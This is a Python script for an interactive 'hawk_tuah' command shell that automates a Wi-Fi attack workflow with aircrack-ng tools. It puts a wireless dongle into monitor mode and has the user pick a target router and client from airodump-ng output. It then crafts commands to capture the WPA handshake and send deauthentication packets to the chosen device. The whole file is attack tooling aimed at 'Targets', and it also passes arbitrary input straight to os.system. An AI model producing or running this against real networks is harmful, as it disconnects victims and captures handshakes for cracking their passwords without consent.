import os
import subprocess

'''
todo
- creating CSV to get best wifi results (based on signal and connected devices from airmon-ng)

'''

AP_DONGLE = 'TP-Link TL-WN722N' # airmon-ng chipset (partial) name of wifi AP
CAP_DIR = '/home/ekomson/Targets'
INTERFACE = None
ROUTER_MAC = None
ROUTER_SSID = None
DEVICE_MAC = None

COMMANDS = {
    'help' : 'Shows this help message',
    'exit' : 'Exits this script',
    'terminal' : 'Executes terminal command',
    'monitor' : 'Executes getting wlan interface, swich to a monitoring mode',
    'craft' : 'Use sudo airmon-ng manually, filter with \'a\' key for \'sta only\' and copy a line of a target'
        }

def main():

    while True:
        user_input = input("hawk_tuah$  ")
        if user_input.lower() == 'exit':
            break

        elif user_input.lower() == 'help':
            print('Available commands: ')
            for command in COMMANDS:
                    print(f" {command} - {COMMANDS[command]}")

        elif user_input.lower() == 'terminal':
            user_input = input("hawk_tuah - terminal$ ")
            os.system(user_input)

        elif user_input.lower() == 'monitor':
            getInterface()
            startMonitoringMode()

        elif user_input.lower() == 'craft':
            getData()
            printData()
            prepareOutputFolder()

        elif user_input.lower() == 'start':
            getInterface()
            startMonitoringMode()
            getData()
            printData()
            prepareOutputFolder()

def getInterface():
    global INTERFACE
    print(f'Searching for {AP_DONGLE} ...')
    airmon_output = subprocess.run(['airmon-ng'], capture_output=True, text=True)
    result=airmon_output.stdout
    lines=result.split('\n')
    adapters_info=[line for line in lines if AP_DONGLE in line]
    INTERFACE = adapters_info[0].split()[1]
    print(f'Success! Found interface: {INTERFACE}')

def startMonitoringMode():
    global INTERFACE
    print(f'Starting monitoring mode ...')
    commands = [
        f'sudo ifconfig {INTERFACE} down',
        f'sudo iwconfig {INTERFACE} mode monitor',
        f'sudo ifconfig {INTERFACE} up'
    ]
    for command in commands:
        print(f'hawk_tuah$ {command}')
        os.system(command)
    
def getData():
    global INTERFACE
    global ROUTER_MAC
    global DEVICE_MAC
    global ROUTER_SSID
    global CHANNEL
    
    while True:
        print(f'\nperform:\nsudo airodump-ng {INTERFACE}')
        subprocess.run(['qterminal', '-e', f'bash -c "sudo airodump-ng {INTERFACE}; exec bash"'])
        print('^copy the line of the selected target\n^filter with \'a\' key for \'sta only\' to see paired devices\n')
        user_input=input()
        macs=user_input.split()
        ROUTER_MAC=macs[0]
        DEVICE_MAC=macs[1]
        print(f'\nperform:\nsudo airodump-ng {INTERFACE} --bssid {ROUTER_MAC}')
        subprocess.run(['qterminal', '-e', f'sudo airodump-ng {INTERFACE} --bssid {ROUTER_MAC}'])
        print('^copy first line to get router details\n')
        user_input=input()
        if user_input != 'back':
            break
    ROUTER_SSID=user_input.split()[10]
    CHANNEL=user_input.split()[5]

def prepareOutputFolder():
    global CAP_DIR
    folder=CAP_DIR+f'/{ROUTER_SSID}'
    print(f'\ncreating folder for cap files: {folder}')
    os.makedirs(folder, exist_ok=True)

def printData():
    print('\n--- SUCCESS - All data collected ---')
    print(f'interface: {INTERFACE}')
    print(f'router SSID: {ROUTER_SSID}')
    print(f'router MAC: {ROUTER_MAC}')
    print(f'channel: {CHANNEL}')
    print(f'device MAC: {DEVICE_MAC}')
    print('\n--- crafting commands ---')
    print('\n-- monitor handshake --')
    print(f'sudo airodump-ng -c {CHANNEL} --bssid {ROUTER_MAC} -w {CAP_DIR}/{ROUTER_SSID}/{ROUTER_SSID} wlan1')
    print('\n-- send deauth packets --')
    print(f'sudo aireplay-ng -0 1 -a {ROUTER_MAC} -c {DEVICE_MAC} {INTERFACE}')
    
main()
